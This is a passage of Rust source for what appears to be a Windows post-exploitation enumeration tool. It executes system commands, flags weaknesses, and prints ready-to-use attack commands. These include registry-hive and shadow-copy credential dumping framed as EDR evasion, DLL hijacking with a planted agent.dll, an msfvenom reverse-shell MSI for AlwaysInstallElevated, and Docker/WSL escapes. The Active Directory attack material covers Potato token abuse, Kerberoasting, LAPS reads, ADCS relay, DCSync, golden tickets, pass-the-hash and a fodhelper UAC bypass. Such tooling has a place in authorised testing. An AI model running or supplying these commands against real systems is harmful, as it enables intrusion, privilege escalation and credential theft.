    cmd_hint("copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM .");
    
    println!("\n  \x1b[1mMethod 3: SeBackupPrivilege (If Available)\x1b[0m");
    let (_, privs) = run(&s_who(), &[&s_priv()]);
    if privs.contains("SeBackupPrivilege") {
        vuln("SeBackupPrivilege available!");
        println!("  \x1b[90mUse backup APIs to read protected files:\x1b[0m");
        cmd_hint("Use BackupOperatorToDA or similar tool");
        cmd_hint("Or: robocopy /B C:\\Windows\\System32\\config .\\config SAM SYSTEM SECURITY");
    }
    
    println!("\n  \x1b[1mMethod 4: WSL Access (If Available)\x1b[0m");
    let wsl_check = run_shell("wsl --status 2>nul");
    if !wsl_check.contains("not recognized") {
        let (_, wsl_uid) = run("wsl", &["-e", "id", "-u"]);
        if wsl_uid.trim() == "0" {
            vuln("WSL running as root - can access protected files!");
            cmd_hint("wsl");
            cmd_hint("cp /mnt/c/Windows/System32/config/SAM /tmp/");
            cmd_hint("cp /mnt/c/Windows/System32/config/SYSTEM /tmp/");
        }
    }
    
    println!("\n  \x1b[1;33m📋 What You Can Extract:\x1b[0m");
    println!("  ┌────────────────────┬─────────────────────────────────────────────┐");
    println!("  │ \x1b[1mHive\x1b[0m               │ \x1b[1mContains\x1b[0m                                    │");
    println!("  ├────────────────────┼─────────────────────────────────────────────┤");
    println!("  │ SAM                │ Local user password hashes (NTLM)           │");
    println!("  │ SYSTEM             │ Boot key to decrypt SAM                     │");
    println!("  │ SECURITY           │ LSA secrets, cached domain creds            │");
    println!("  │ NTDS.dit (DC only) │ All domain user hashes                      │");
    println!("  └────────────────────┴─────────────────────────────────────────────┘");
    
    println!("\n  \x1b[1;32m✅ Why Use Hive Dumps vs LSASS:\x1b[0m");
    println!("  • \x1b[32m🛡️  Avoids LSASS memory access\x1b[0m - Most EDRs monitor LSASS");
    println!("  • \x1b[32m📄 Offline analysis\x1b[0m - Extract & analyze post-exfil");
    println!("  • \x1b[32m🔇 Quieter\x1b[0m - Less likely to trigger alerts");
    println!("  • \x1b[32m🔄 Repeatable\x1b[0m - Shadow copies persist");
}

// ==================== PATH & DLL HIJACKING ====================

fn check_paths() {
    section("📁 PATH & DLL HIJACKING");
    
    let path_var = env::var("PATH").unwrap_or_default();
    let mut writable_paths = Vec::new();
    let mut all_user_paths = Vec::new();
    
    println!("\n  \x1b[1mPATH Environment Analysis:\x1b[0m");
    
    for dir in path_var.split(';') {
        if dir.is_empty() { continue; }
        
        // Skip system dirs for writable check
        let is_system = contains_any(&dir.to_lowercase(), &["windows", "system32", "winsxs", "windowsapps", "program files"]);
        
        if !is_system {
            all_user_paths.push(dir.to_string());
            
            if let Ok(meta) = fs::metadata(dir) {
                if meta.is_dir() {
                    let icacls = run_shell(&format!("icacls \"{}\" 2>nul | findstr /i \"BUILTIN\\\\Users Everyone Authenticated\"", dir));
                    if contains_any(&icacls, &["(F)", "(M)", "(W)"]) {
                        writable_paths.push(dir.to_string());
                    }
                }
            }
        }
    }
    
    // Show all non-system paths
    if !all_user_paths.is_empty() {
        info(&format!("{} non-system PATH directories:", all_user_paths.len()));
        for path in &all_user_paths {
            let is_writable = writable_paths.contains(path);
            if is_writable {
                println!("    \x1b[32m[WRITABLE]\x1b[0m {}", path);
            } else {
                println!("    \x1b[90m[READ-ONLY]\x1b[0m {}", path);
            }
        }
    }
    
    if !writable_paths.is_empty() {
        vuln(&format!("{} writable PATH directories - DLL hijack possible!", writable_paths.len()));
        cmd_hint("# Place malicious DLL in writable PATH before System32");
        for wpath in &writable_paths {
            cmd_hint(&format!("copy agent.dll \"{}\\<target>.dll\"", wpath));
        }
    } else {
        ok("No writable user PATH directories found");
        info("Check Defender exclusion paths as alternatives");
    }
    
    // Check known DLL hijack opportunities
    println!("\n  \x1b[1mKnown DLL Hijack Services:\x1b[0m");
    
    let hijacks = [
        ("IKEEXT", "wlbsctrl.dll", "LocalSystem", "IKE and AuthIP IPsec - Trigger: net start IKEEXT"),
        ("SessionEnv", "TSMSISrv.dll", "LocalSystem", "RDP Config - Trigger: RDP connection"),
        ("MSDTC", "oci.dll", "NetworkService", "Distributed Transaction Coordinator"),
        ("Netman", "wlanapi.dll", "LocalSystem", "Network Connections - Trigger: netsh"),
        ("Schedule", "WptsExtensions.dll", "LocalSystem", "Task Scheduler"),
    ];
    
    let mut found_any = false;
    for (svc, dll, runas, desc) in hijacks.iter() {
        let (exists, qc) = run(&s_sc(), &["qc", svc]);
        if exists && (qc.contains("STATE") || qc.contains("SERVICE_NAME")) {
            found_any = true;
            let state = if qc.contains("RUNNING") { "RUNNING" } else { "STOPPED" };
            let svc_runas = if qc.contains("LocalSystem") { "LocalSystem" } 
                           else if qc.contains("NetworkService") { "NetworkService" }
                           else { runas };
            
            println!("\n    \x1b[33m[{}]\x1b[0m {} ({})", state, svc, svc_runas);
            println!("      DLL: \x1b[36m{}\x1b[0m", dll);
            println!("      {}", desc);
            
            // If we have writable paths, show the hijack command
            if !writable_paths.is_empty() {
                for wpath in &writable_paths {
                    vuln(&format!("      HIJACK: copy agent.dll \"{}\\{}\"", wpath, dll));
                    break;
                }
            }
        }
    }
    
    if !found_any {
        info("No common DLL hijack services found running");
    }
    
    // Additional DLL hijack techniques
    println!("\n  \x1b[1mAlternative DLL Hijack Methods:\x1b[0m");
    
    info("AppData hijacks (user-writable by default):");
    let appdata = env::var("APPDATA").unwrap_or_default();
    let localappdata = env::var("LOCALAPPDATA").unwrap_or_default();
    
    if !appdata.is_empty() {
        cmd_hint(&format!("copy agent.dll \"{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\<name>.dll\"", appdata));
    }
    
    info("Known app hijacks (if installed):");
    let app_hijacks = [
        ("Teams", "ffmpeg.dll", "%LOCALAPPDATA%\\Microsoft\\Teams\\current"),
        ("Slack", "ffmpeg.dll", "%LOCALAPPDATA%\\slack\\app-*"),
        ("Discord", "ffmpeg.dll", "%LOCALAPPDATA%\\Discord\\app-*"),
        ("VS Code", "rg.exe", "%LOCALAPPDATA%\\Programs\\Microsoft VS Code\\resources\\app\\node_modules"),
    ];
    
    for (app, file, path) in app_hijacks.iter() {
        let expanded = path.replace("%LOCALAPPDATA%", &localappdata);
        if fs::metadata(&expanded.split('*').next().unwrap_or(&expanded)).is_ok() {
            vuln(&format!("{} may be hijackable via {}", app, file));
            cmd_hint(&format!("dir \"{}\" 2>nul", path));
        }
    }
}

// ==================== SERVICES ====================

fn check_services() {
    section("⚙️  SERVICE MISCONFIGURATIONS");
    
    // Unquoted paths
    println!("\n  \x1b[1mUnquoted Service Paths:\x1b[0m");
    let svc_out = run_shell("wmic service get name,pathname,startmode 2>nul");
    let mut unquoted_count = 0;
    
    for line in svc_out.lines() {
        let line = line.trim();
        if line.is_empty() { continue; }
        if line.contains("System32") || line.contains("system32") { continue; }
        if !line.contains("Program Files") && !line.contains("Program Files (x86)") { continue; }
        
        // Check if path has spaces but isn't quoted
        if line.contains(" ") && !line.contains("\"") && line.contains(".exe") {
            unquoted_count += 1;
            if unquoted_count <= 5 {
                vuln(&format!("Unquoted: {}", &line[..line.len().min(80)]));
            }
        }
    }
    
    if unquoted_count > 5 {
        info(&format!("...and {} more unquoted paths", unquoted_count - 5));
    }
    
    // Modifiable service binaries
    println!("\n  \x1b[1mService Binary Permissions:\x1b[0m");
    let accesschk = run_shell("where accesschk.exe 2>nul");
    if accesschk.contains("accesschk") {
        cmd_hint("accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula");
    } else {
        info("Use accesschk.exe for detailed permission check");
        cmd_hint("Download: https://live.sysinternals.com/accesschk.exe");
    }
    
    // Services running as SYSTEM that we might be able to restart
    println!("\n  \x1b[1mLocalSystem Services (restartable):\x1b[0m");
    let system_svcs = run_shell("wmic service where \"StartName='LocalSystem' and State='Running'\" get Name,StartMode 2>nul");
    let mut restart_count = 0;
    
    for line in system_svcs.lines() {
        let line = line.trim();
        if line.is_empty() || line.contains("Name") { continue; }
        
        let svc_name = line.split_whitespace().next().unwrap_or("");
        if svc_name.is_empty() { continue; }
        
        // Check if we can stop/start
        let (can_query, _) = run(&s_sc(), &["qc", svc_name]);
        if can_query {
            restart_count += 1;
            if restart_count <= 3 {
                info(&format!("{} (LocalSystem)", svc_name));
            }
        }
    }
}

// ==================== SCHEDULED TASKS ====================

fn check_tasks() {
    section("📅 SCHEDULED TASKS");
    
    let user = env::var("USERNAME").unwrap_or_default();
    
    // Tasks running as SYSTEM with writable paths
    let tasks = run_shell("schtasks /query /fo CSV /v 2>nul | findstr /i \"SYSTEM\"");
    let mut system_tasks = 0;
    
    for line in tasks.lines() {
        if line.contains("SYSTEM") && (line.contains("Users") || line.contains(&user)) {
            system_tasks += 1;
            if system_tasks <= 3 {
                let parts: Vec<&str> = line.split(',').collect();
                if parts.len() > 1 {
                    vuln(&format!("SYSTEM task with user path: {}", parts[0].trim_matches('"')));
                }
            }
        }
    }
    
    if system_tasks > 3 {
        info(&format!("...and {} more SYSTEM tasks with user paths", system_tasks - 3));
    }
    
    // Tasks in user writable locations
    let user_tasks = run_shell(&format!("schtasks /query /fo CSV /v 2>nul | findstr /i \"C:\\\\Users\\\\{}\"", user));
    if !user_tasks.trim().is_empty() {
        ok("Tasks running from user directories found");
        cmd_hint("Check if you can modify the binary");
    }
}

// ==================== ALWAYS INSTALL ELEVATED ====================

fn check_always_elevated() {
    section("📦 ALWAYSINSTALLELEVATED");
    
    let hkcu = run_shell("reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul");
    let hklm = run_shell("reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul");
    
    let hkcu_enabled = hkcu.contains("0x1");
    let hklm_enabled = hklm.contains("0x1");
    
    if hkcu_enabled && hklm_enabled {
        vuln("AlwaysInstallElevated ENABLED in both HKCU and HKLM!");
        cmd_hint("msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=Y -f msi > shell.msi");
        cmd_hint("msiexec /quiet /qn /i shell.msi");
    } else if hkcu_enabled {
        ok("AlwaysInstallElevated in HKCU only (need both)");
    } else if hklm_enabled {
        ok("AlwaysInstallElevated in HKLM only (need both)");
    } else {
        fail("AlwaysInstallElevated not configured");
    }
}

// ==================== DOCKER & WSL ====================

fn check_containers() {
    section("🐳 DOCKER & WSL");
    
    // Docker group
    let (_, groups) = run(&s_who(), &[&s_grp()]);
    if groups.to_lowercase().contains("docker") {
        vuln("User is in docker-users group!");
        cmd_hint("docker run -v C:\\:C:\\host -it alpine sh");
        cmd_hint("# Then access C:\\host\\Windows\\System32\\config\\SAM");
    }
    
    // Docker available
    let (docker_ok, docker_ver) = run("docker", &["--version"]);
    if docker_ok {
        ok(&format!("Docker: {}", docker_ver.trim()));
        
        // Check if docker socket accessible
        let (socket_ok, _) = run("docker", &["ps"]);
        if socket_ok {
            vuln("Docker socket accessible - container escape possible!");
        }
    }
    
    // Hyper-V Administrators
    if groups.contains("S-1-5-32-578") {
        vuln("User is in Hyper-V Administrators group!");
    }
    
    // WSL
    let wsl_list = run_shell("wsl --list 2>nul");
    if !wsl_list.contains("not recognized") && !wsl_list.is_empty() {
        ok("WSL installed");
        
        for line in wsl_list.lines() {
            if line.contains("(Default)") || (!line.is_empty() && !line.contains("Windows Subsystem")) {
                info(&format!("Distribution: {}", line.trim()));
            }
        }
        
        let (_, wsl_uid) = run("wsl", &["-e", "id", "-u"]);
        if wsl_uid.trim() == "0" {
            vuln("WSL runs as root by default!");
            cmd_hint("wsl  # Enter WSL shell");
            cmd_hint("wsl -e cat /mnt/c/Windows/System32/config/SAM > /tmp/sam");
            cmd_hint("wsl -e cp /tmp/payload.exe /mnt/c/Windows/Temp/");
            cmd_hint("# Bypass Defender: copy files via WSL to excluded paths");
        } else {
            info(&format!("WSL runs as uid {}", wsl_uid.trim()));
            cmd_hint("wsl -u root  # Try switching to root");
        }
    }
}

// ==================== NETWORK ====================

fn check_network() {
    section("🌐 NETWORK INFORMATION");
    
    // Interfaces
    let ipconfig = run_shell("ipconfig /all 2>nul | findstr /i \"IPv4 Subnet DNS\"");
    for line in ipconfig.lines().take(10) {
        info(line.trim());
    }
    
    // Listening ports
    println!("\n  \x1b[1mListening Ports:\x1b[0m");
    let netstat = run_shell("netstat -ano 2>nul | findstr LISTENING | findstr -v \"\\[::\"");
    let mut ports: Vec<String> = Vec::new();
    
    for line in netstat.lines().take(15) {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() >= 4 {
            let addr = parts[1];
            let pid = parts[parts.len() - 1];
            if !ports.contains(&addr.to_string()) {
                ports.push(addr.to_string());
                info(&format!("{} (PID: {})", addr, pid));
            }
        }
    }
    
    // Check for interesting services
    let interesting_ports = ["445", "3389", "5985", "5986", "1433", "3306", "1521", "6379", "27017"];
    for port in interesting_ports.iter() {
        if netstat.contains(&format!(":{}", port)) {
            vuln(&format!("Interesting port listening: {}", port));
        }
    }
    
    // Firewall status
    let fw = run_shell("netsh advfirewall show allprofiles state 2>nul");
    if fw.contains("OFF") {
        vuln("Firewall is OFF for some profiles");
    }
}

// ==================== INTERESTING FILES ====================

fn check_files() {
    section("📄 INTERESTING FILES");
    
    let user = env::var("USERNAME").unwrap_or_default();
    let home = format!("C:\\Users\\{}", user);
    
    // Config files that might contain creds
    let config_files = [
        ("web.config", "IIS config with connection strings"),
        ("appsettings.json", ".NET Core config"),
        ("*.config", "Various config files"),
        ("id_rsa", "SSH private key"),
        ("*.pfx", "Certificate with private key"),
        ("*.p12", "Certificate with private key"),
        ("KeePass*.kdbx", "KeePass database"),
        ("*.rdp", "RDP connection files"),
    ];
    
    println!("  \x1b[1mSearch for sensitive files:\x1b[0m");
    for (pattern, _desc) in config_files.iter() {
        cmd_hint(&format!("dir /s /b C:\\Users\\{}\\*{} 2>nul", user, pattern));
    }
    
    // Check common locations
    let common_paths = [
        (format!("{}\\Desktop", home), "Desktop"),
        (format!("{}\\Documents", home), "Documents"),
        (format!("{}\\Downloads", home), "Downloads"),
        (format!("{}\\.ssh", home), "SSH directory"),
        (format!("{}\\.aws", home), "AWS credentials"),
        (format!("{}\\.azure", home), "Azure credentials"),
        (format!("{}\\AppData\\Roaming\\FileZilla", home), "FileZilla (FTP creds)"),
    ];
    
    println!("\n  \x1b[1mChecking common locations:\x1b[0m");
    for (path, name) in common_paths.iter() {
        if Path::new(path).exists() {
            ok(&format!("{} exists", name));
        }
    }
    
    // Git repos might have secrets
    let git_check = run_shell(&format!("dir /s /b /ad \"{}\\*\\.git\" 2>nul", home));
    if !git_check.trim().is_empty() {
        ok("Git repositories found - check for secrets in history");
        cmd_hint("git log -p | findstr -i password");
    }
}

// ==================== POTATO ATTACKS ====================

fn check_potato() {
    section("🥔 POTATO ATTACK READINESS");
    
    // Use direct commands for reliability
    let privs = run_shell("whoami /priv");
    let groups = run_shell("whoami /groups");
    
    // Check if privilege is ENABLED (not just present)
    let mut has_impersonate_enabled = false;
    let mut has_assign_enabled = false;
    
    for line in privs.lines() {
        if line.contains("SeImpersonatePrivilege") && line.contains("Enabled") {
            has_impersonate_enabled = true;
        }
        if line.contains("SeAssignPrimaryTokenPrivilege") && line.contains("Enabled") {
            has_assign_enabled = true;
        }
    }
    
    let is_high = groups.contains("High Mandatory") || groups.contains("System Mandatory");
    
    if has_impersonate_enabled || has_assign_enabled {
        vuln("Token impersonation privileges ENABLED!");
        println!("\n  \x1b[1mRecommended Tools:\x1b[0m");
        
        println!("\n  \x1b[33mGodPotato\x1b[0m (Windows 10/11/Server 2019+):");
        cmd_hint("GodPotato.exe -cmd \"cmd /c whoami\"");
        cmd_hint("GodPotato.exe -cmd \"rundll32.exe agent.dll,Start\"");
        
        println!("\n  \x1b[33mPrintSpoofer\x1b[0m (if Print Spooler running):");
        cmd_hint("PrintSpoofer.exe -i -c cmd.exe");
        
        println!("\n  \x1b[33mSweetPotato\x1b[0m (multiple techniques):");
        cmd_hint("SweetPotato.exe -p cmd.exe -a \"/c whoami\"");
        
        println!("\n  \x1b[33mJuicyPotatoNG\x1b[0m (CLSID-based):");
        cmd_hint("JuicyPotatoNG.exe -t * -p cmd.exe");
        
    } else if is_high {
        ok("Already High/System integrity - no potato needed");
        cmd_hint("You can access most resources directly");
    } else {
        fail("No impersonation privileges - Potato attacks won't work");
        info("Need to elevate first (UAC bypass, etc.)");
    }
}

// ==================== ACTIVE DIRECTORY ENUMERATION ====================

fn is_domain_joined() -> bool {
    let domain_info = run_shell("wmic computersystem get partofdomain /value 2>nul");
    domain_info.to_lowercase().contains("partofdomain=true")
}

fn check_ad_info() {
    if !is_domain_joined() {
        return;
    }
    
    banner("🏰 ACTIVE DIRECTORY ENUMERATION");
    
    // Basic domain info
    section("📋 DOMAIN INFORMATION");
    
    let domain = run_shell("echo %USERDNSDOMAIN%");
    let logon_server = run_shell("echo %LOGONSERVER%");
    
    info(&format!("Domain: {}", domain.trim()));
    info(&format!("Logon Server: {}", logon_server.trim()));
    
    // Get all DCs
    let dcs = run_shell("nltest /dclist:%USERDNSDOMAIN% 2>nul");
    if !dcs.contains("ERROR") {
        subsec("Domain Controllers:");
        for line in dcs.lines() {
            if line.contains("\\\\") || line.contains("[PDC]") {
                data("DC", line.trim());
            }
        }
    }
    
    // Forest info
    let forest = run_shell("nltest /dsgetfti:%USERDNSDOMAIN% 2>nul");
    if !forest.contains("ERROR") && forest.contains("ForestName") {
        for line in forest.lines() {
            if line.contains("ForestName") {
                data("Forest", line.trim());
                break;
            }
        }
    }
}

fn check_ad_users() {
    section("👥 HIGH VALUE USERS");
    
    // Domain Admins
    subsec("Domain Admins:");
    let da = run_shell("net group \"Domain Admins\" /domain 2>nul");
    if !da.contains("error") {
        let mut count = 0;
        for line in da.lines() {
            let line = line.trim();
            if !line.is_empty() && !line.contains("-----") && !line.contains("Group name") 
               && !line.contains("Comment") && !line.contains("Members") && !line.contains("The command") {
                vuln(&format!("DA: {}", line));
                count += 1;
            }
        }
        if count > 0 {
            cmd_hint("Target these accounts for credential theft");
        }
    }
    
    // Enterprise Admins
    subsec("Enterprise Admins:");
    let ea = run_shell("net group \"Enterprise Admins\" /domain 2>nul");
    if !ea.contains("error") {
        for line in ea.lines() {
            let line = line.trim();
            if !line.is_empty() && !line.contains("-----") && !line.contains("Group name")
               && !line.contains("Comment") && !line.contains("Members") && !line.contains("The command") {
                critical(&format!("EA: {}", line));
            }
        }
    }
    
    // Schema Admins
    let sa = run_shell("net group \"Schema Admins\" /domain 2>nul");
    if !sa.contains("error") && sa.lines().count() > 6 {
        subsec("Schema Admins:");
        for line in sa.lines() {
            let line = line.trim();
            if !line.is_empty() && !line.contains("-----") && !line.contains("Group name")
               && !line.contains("Comment") && !line.contains("Members") && !line.contains("The command") {
                critical(&format!("SA: {}", line));
            }
        }
    }
    
    // Current user's groups
    subsec("Current User Domain Groups:");
    let my_groups = run_shell("whoami /groups /fo csv 2>nul");
    for line in my_groups.lines() {
        if line.to_lowercase().contains("admin") || line.contains("S-1-5-21") {
            let parts: Vec<&str> = line.split(',').collect();
            if parts.len() > 1 {
                let group = parts[0].trim_matches('"');
                if group.contains("\\") {
                    info(&format!("Member of: {}", group));
                }
            }
        }
    }
}

fn check_ad_spn() {
    section("🎫 KERBEROASTABLE ACCOUNTS (SPNs)");
    
    // Use setspn to find SPNs
    let spns = run_shell("setspn -Q */* 2>nul");
    
    if spns.contains("Checking domain") {
        let mut spn_users: Vec<String> = Vec::new();
        let mut current_cn = String::new();
        
        for line in spns.lines() {
            let line = line.trim();
            if line.starts_with("CN=") {
                current_cn = line.to_string();
            } else if !line.is_empty() && !line.contains("Checking domain") 
                      && !line.contains("Existing SPN") && line.contains("/") {
                // This is an SPN
                if !current_cn.is_empty() && !spn_users.contains(&current_cn) {
                    spn_users.push(current_cn.clone());
                    vuln(&format!("Kerberoastable: {}", current_cn));
                    data("SPN", line);
                }
            }
        }
        
        if !spn_users.is_empty() {
            println!();
            cmd_hint("# Kerberoast with Rubeus:");
            cmd_hint("Rubeus.exe kerberoast /outfile:hashes.txt");
            cmd_hint("# Or with GetUserSPNs.py:");
            cmd_hint("GetUserSPNs.py domain/user:pass -request -outputfile hashes.txt");
            cmd_hint("# Crack with hashcat:");
            cmd_hint("hashcat -m 13100 hashes.txt wordlist.txt");
        }
    } else {
        info("Could not enumerate SPNs (setspn not available or no results)");
        cmd_hint("Try: powershell Get-ADUser -Filter {ServicePrincipalName -ne '$null'}");
    }
}

fn check_ad_delegation() {
    section("🔓 DELEGATION (Unconstrained/Constrained)");
    
    // Check for unconstrained delegation via LDAP query
    // Using dsquery if available
    let unconstrained = run_shell("dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=524288)\" -attr cn 2>nul");
    
    if !unconstrained.contains("error") && !unconstrained.trim().is_empty() {
        subsec("Unconstrained Delegation:");
        for line in unconstrained.lines() {
            if !line.trim().is_empty() && !line.contains("cn") {
                critical(&format!("UNCONSTRAINED: {}", line.trim()));
            }
        }
        cmd_hint("# Unconstrained = can impersonate ANY user who connects!");
        cmd_hint("# Use Rubeus to monitor for TGTs:");
        cmd_hint("Rubeus.exe monitor /interval:5");
    }
    
    // Check constrained delegation
    let constrained = run_shell("dsquery * -filter \"(msDS-AllowedToDelegateTo=*)\" -attr cn msDS-AllowedToDelegateTo 2>nul");
    
    if !constrained.contains("error") && !constrained.trim().is_empty() && constrained.contains("msDS") {
        subsec("Constrained Delegation:");
        for line in constrained.lines() {
            if !line.trim().is_empty() {
                vuln(&format!("CONSTRAINED: {}", line.trim()));
            }
        }
        cmd_hint("# Can delegate to specific services - S4U2Self/S4U2Proxy attack");
    }
    
    // Resource-Based Constrained Delegation (RBCD)
    info("Check for RBCD (Resource-Based Constrained Delegation):");
    cmd_hint("Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity");
}

fn check_ad_laps() {
    section("🔑 LAPS (Local Admin Password Solution)");
    
    // Check if LAPS is installed
    let laps_dll = Path::new("C:\\Program Files\\LAPS\\CSE\\AdmPwd.dll");
    let laps_installed = laps_dll.exists();
    
    if laps_installed {
        vuln("LAPS is installed on this machine!");
        
        // Check if we can read LAPS passwords
        let laps_read = run_shell("powershell.exe -c \"Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null} | Select-Object Name, 'ms-Mcs-AdmPwd' | Format-Table\" 2>nul");
        
        if laps_read.contains("ms-Mcs-AdmPwd") && !laps_read.contains("error") {
            critical("CAN READ LAPS PASSWORDS!");
            for line in laps_read.lines().take(10) {
                if !line.trim().is_empty() {
                    println!("    {}", line);
                }
            }
        } else {
            info("LAPS installed but cannot read passwords (need rights)");
        }
        
        cmd_hint("# Try reading LAPS with PowerView:");
        cmd_hint("Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match 'ms-Mcs-AdmPwd'}");
    } else {
        ok("LAPS not detected on this machine");
        info("Check other machines: Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd");
    }
}

fn check_ad_adcs() {
    section("📜 ADCS (Certificate Services)");
    
    // Find CA servers
    let ca_query = run_shell("certutil -config - -ping 2>nul");
    
    if ca_query.contains("Config:") || ca_query.contains("CA ") {
        vuln("Certificate Authority found!");
        
        for line in ca_query.lines() {
            if line.contains("Config:") || line.contains("CA ") {
                data("CA", line.trim());
            }
        }
        
        // Check for vulnerable templates
        subsec("Certificate Template Attacks:");
        cmd_hint("# Find vulnerable templates with Certify:");
        cmd_hint("Certify.exe find /vulnerable");
        cmd_hint("");
        cmd_hint("# ESC1: Template allows SAN (Subject Alt Name)");
        cmd_hint("Certify.exe request /ca:CA /template:VulnTemplate /altname:administrator");
        cmd_hint("");
        cmd_hint("# ESC4: Template ACL allows modification");
        cmd_hint("# ESC8: Web enrollment enabled (NTLM relay)");
        cmd_hint("ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs");
    } else {
        info("No local CA detected");
        cmd_hint("# Enumerate CAs in domain:");
        cmd_hint("certutil -config - -ping");
        cmd_hint("# Or with Certify:");
        cmd_hint("Certify.exe cas");
    }
}

fn check_ad_shares() {
    section("📂 NETWORK SHARES");
    
    // Find shares on DC
    let logon_server = run_shell("echo %LOGONSERVER%").trim().replace("\\\\", "");
    
    if !logon_server.is_empty() {
        subsec(&format!("Shares on DC ({}):", logon_server));
        let dc_shares = run_shell(&format!("net view \\\\{} 2>nul", logon_server));
        
        for line in dc_shares.lines() {
            if line.contains("Disk") || line.contains("$") {
                info(line.trim());
            }
        }
        
        // Check SYSVOL for GPP passwords
        let sysvol = format!("\\\\{}\\SYSVOL", logon_server);
        let gpp_check = run_shell(&format!("dir /s /b \"{}\\*Groups.xml\" \"{}\\*Services.xml\" \"{}\\*ScheduledTasks.xml\" \"{}\\*DataSources.xml\" 2>nul", sysvol, sysvol, sysvol, sysvol));
        
        if !gpp_check.trim().is_empty() {
            vuln("GPP XML files found - may contain cpassword!");
            for line in gpp_check.lines().take(5) {
                data("File", line.trim());
            }
            cmd_hint("# Decrypt cpassword with gpp-decrypt or Get-GPPPassword");
        }
        
        // NETLOGON scripts
        let netlogon = format!("\\\\{}\\NETLOGON", logon_server);
        let scripts = run_shell(&format!("dir /b \"{}\" 2>nul", netlogon));
        if !scripts.trim().is_empty() {
            subsec("NETLOGON Scripts (may contain creds):");
            for line in scripts.lines().take(10) {
                info(line.trim());
            }
            cmd_hint(&format!("type \"{}\\<script>\" | findstr /i password", netlogon));
        }
    }
}

fn check_ad_trusts() {
    section("🤝 DOMAIN TRUSTS");
    
    let trusts = run_shell("nltest /domain_trusts /all_trusts 2>nul");
    
    if !trusts.contains("ERROR") {
        for line in trusts.lines() {
            let line = line.trim();
            if line.contains("Trust") || line.contains("->") {
                if line.to_lowercase().contains("forest") {
                    critical(&format!("Forest Trust: {}", line));
                } else if line.to_lowercase().contains("external") {
                    vuln(&format!("External Trust: {}", line));
                } else {
                    info(line);
                }
            }
        }
        
        cmd_hint("# Enumerate trust with PowerView:");
        cmd_hint("Get-DomainTrust");
        cmd_hint("Get-ForestDomain");
    }
}

fn ad_summary() {
    banner("📋 AD ATTACK QUICK REFERENCE");
    
    println!("\n\x1b[1;33m▶ Kerberoasting:\x1b[0m");
    println!("\x1b[96m  Rubeus.exe kerberoast /outfile:hashes.txt");
    println!("  hashcat -m 13100 hashes.txt wordlist.txt\x1b[0m");
    
    println!("\n\x1b[1;33m▶ AS-REP Roasting:\x1b[0m");
    println!("\x1b[96m  Rubeus.exe asreproast /outfile:asrep.txt");
    println!("  GetNPUsers.py domain/ -usersfile users.txt -no-pass\x1b[0m");
    
    println!("\n\x1b[1;33m▶ DCSync (need Replication rights):\x1b[0m");
    println!("\x1b[96m  mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator");
    println!("  secretsdump.py domain/user:pass@DC\x1b[0m");
    
    println!("\n\x1b[1;33m▶ Golden Ticket:\x1b[0m");
    println!("\x1b[96m  mimikatz # kerberos::golden /user:Administrator /domain:X /sid:X /krbtgt:HASH /ptt\x1b[0m");
    
    println!("\n\x1b[1;33m▶ Pass-the-Hash:\x1b[0m");
    println!("\x1b[96m  mimikatz # sekurlsa::pth /user:admin /domain:X /ntlm:HASH");
    println!("  psexec.py -hashes :NTLM domain/admin@target\x1b[0m");
    
    println!("\n\x1b[1;33m▶ ADCS ESC1 (if vulnerable template):\x1b[0m");
    println!("\x1b[96m  Certify.exe request /ca:CA /template:VulnTemplate /altname:administrator\x1b[0m");
}

// ==================== SUMMARY ====================

fn summary() {
    banner("📋 QUICK REFERENCE - LOCAL ATTACK COMMANDS");
    
    println!("\n\x1b[1;33m▶ UAC Bypass (fodhelper):\x1b[0m");
    println!("\x1b[96m  reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /d \"cmd /c YOUR_CMD\" /f");
    println!("  reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /f");
    println!("  fodhelper.exe");
    println!("  reg delete HKCU\\Software\\Classes\\ms-settings /f\x1b[0m");
    
    println!("\n\x1b[1;33m▶ SAM/SYSTEM Dump (requires admin):\x1b[0m");
    println!("\x1b[96m  reg save HKLM\\SAM sam.save");
    println!("  reg save HKLM\\SYSTEM system.save");
    println!("  reg save HKLM\\SECURITY security.save");
    println!("  # Offline: secretsdump.py -sam sam.save -system system.save -security security.save LOCAL\x1b[0m");
    
    println!("\n\x1b[1;33m▶ Shadow Copy Method:\x1b[0m");
    println!("\x1b[96m  vssadmin create shadow /for=C:");
    println!("  copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM .");
    println!("  copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM .\x1b[0m");
    
    println!("\n\x1b[1;33m▶ WSL File Access:\x1b[0m");
    println!("\x1b[96m  wsl");
    println!("  cp /mnt/c/Windows/System32/config/SAM /tmp/");
    println!("  cp /mnt/c/Windows/System32/config/SYSTEM /tmp/\x1b[0m");
    
    println!("\n\x1b[1;33m▶ GodPotato (with SeImpersonate):\x1b[0m");
    println!("\x1b[96m  GodPotato.exe -cmd \"cmd /c whoami\"");
    println!("  GodPotato.exe -cmd \"rundll32.exe C:\\path\\agent.dll,Start\"\x1b[0m");
    
    println!("\n\x1b[1;33m▶ Docker Escape:\x1b[0m");
    println!("\x1b[96m  docker run -v C:\\:C:\\host -it alpine sh");
    println!("  cat /host/Windows/System32/config/SAM\x1b[0m");
}

// ==================== MAIN ====================

fn main() {
    header();
    
    check_system_info();
    check_context();
    check_uac();
